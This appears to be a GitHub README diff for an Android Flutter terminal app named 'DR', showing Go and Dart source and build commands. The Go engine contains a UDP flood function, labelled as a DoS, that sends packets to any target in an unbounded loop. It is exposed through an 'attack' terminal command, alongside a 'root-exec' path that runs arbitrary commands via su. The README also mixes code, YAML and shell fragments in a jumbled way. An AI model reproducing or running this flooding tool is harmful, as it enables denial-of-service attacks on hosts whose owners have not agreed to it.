# DR
DR

 
‎README.md‎
Número de línea del archivo original	Número de línea de diferencia	Cambio de línea diferencial
@@ -681,5 +681,131 @@ flutter:
  assets:
    - assets/bin/dr-terminal
    - assets/bin/busybox
// [DR-SYSTEM] - Terminal Core Engine
// Signature: L
package main
import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)
// Ejecuta comandos del sistema o BusyBox (Soporta Root)
func systemExec(isRoot bool, name string, args []string) {
	var cmd *exec.Cmd
	if isRoot {
		// Ejecución vía su para permisos de superusuario
		fullCmd := name + " " + strings.Join(args, " ")
		cmd = exec.Command("su", "-c", fullCmd)
	} else {
		cmd = exec.Command(name, args...)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("\n[DR-SYSTEM][ERROR] %v - Signature: L\n", err)
		return
	}
	fmt.Print(string(out))
}
// Inundación UDP (Stress Test / DoS)
func udpFlood(target string) {
	connection, err := net.Dial("udp", target+":80")
	if err != nil {
		fmt.Printf("[ERROR] No route to %s - L\n", target)
		return
	}
	defer connection.Close()
	packet := make([]byte, 1024) 
	fmt.Printf("[DR-SYSTEM] Flooding target: %s... [L]\n", target)
	for {
		_, err := connection.Write(packet)
		if err != nil { break }
	}
}
func main() {
	if len(os.Args) < 2 {
		fmt.Println("[DR-SYSTEM] L-Terminal Active. Waiting for commands...")
		return
	}
	command := os.Args[1]
	switch command {
	case "install":
		if len(os.Args) < 3 { return }
		pkg := os.Args[2]
		fmt.Printf("\r\n[DR-SYSTEM] Deployment: %s... [L]\n", pkg)
		// Lógica de descarga/unzip aquí
		fmt.Printf("[DR-SYSTEM] Success: %s installed.\n", pkg)
	case "whois":
		if len(os.Args) < 3 { return }
		systemExec(false, "busybox", []string{"whois", os.Args[2]})
	case "attack":
		if len(os.Args) < 3 { return }
		udpFlood(os.Args[2])
	case "root-exec":
		if len(os.Args) < 3 { return }
		systemExec(true, os.Args[2], os.Args[3:])
	default:
		// Si no es un comando interno, usa BusyBox para resolver (ls, cd, ping, etc)
		systemExec(false, "busybox", os.Args[1:])
	}
}
// [DR-SYSTEM] Interface Handler
// Signature: L
import 'dart:io';
import 'dart:convert';
import 'package:flutter/services.dart';
import 'package:path_provider/path_provider.dart';
Future<void> handleTerminalInput(String input) async {
  final parts = input.trim().split(' ');
  if (parts.isEmpty) return;
  if (input == 'pkg install DR') {
    terminal.write('\r\n[DR-SYSTEM] Starting L-Deployment...\r\n');
    await executeGoEngine('install', 'DR');
  } else if (parts[0] == 'attack') {
    terminal.write('\r\n[DR-SYSTEM] WARNING: Attack mode L-initialized\r\n');
    executeGoEngine('attack', parts[1]);
  } else {
    // Envía el comando y sus argumentos al motor de Go
    executeGoEngine(parts[0], parts.length > 1 ? parts[1] : '');
  }
}
Future<void> executeGoEngine(String command, String arg) async {
  final directory = await getApplicationDocumentsDirectory();
  final exePath = '${directory.path}/dr-terminal';
  
  // Seteamos PATH para que encuentre BusyBox en la carpeta de la app
  final env = {"PATH": "${directory.path}:/system/bin:/system/xbin"};
  try {
    final process = await Process.start(exePath, [command, arg], environment: env);
    process.stdout.transform(utf8.decoder).listen((data) {
      terminal.write(data);
    });
    process.stderr.transform(utf8.decoder).listen((data) {
      terminal.write('\r\n[L-SYSTEM ERROR] $data');
    });
  } catch (e) {
    terminal.write('\r\n[ERROR] Core Engine L-Fail: $e\n');
  }
}

chmod 755
# Entra a la carpeta de tu motor
cd core-engine

# Compila para Android de 64 bits
GOOS=android GOARCH=arm64 go build -o ../terminal_app/assets/bin/dr-terminal main.go
flutter:
  assets:
    - assets/bin/dr-terminal
    - assets/bin/busybox
    cd terminal_app
flutter build apk --release --split-per-abi
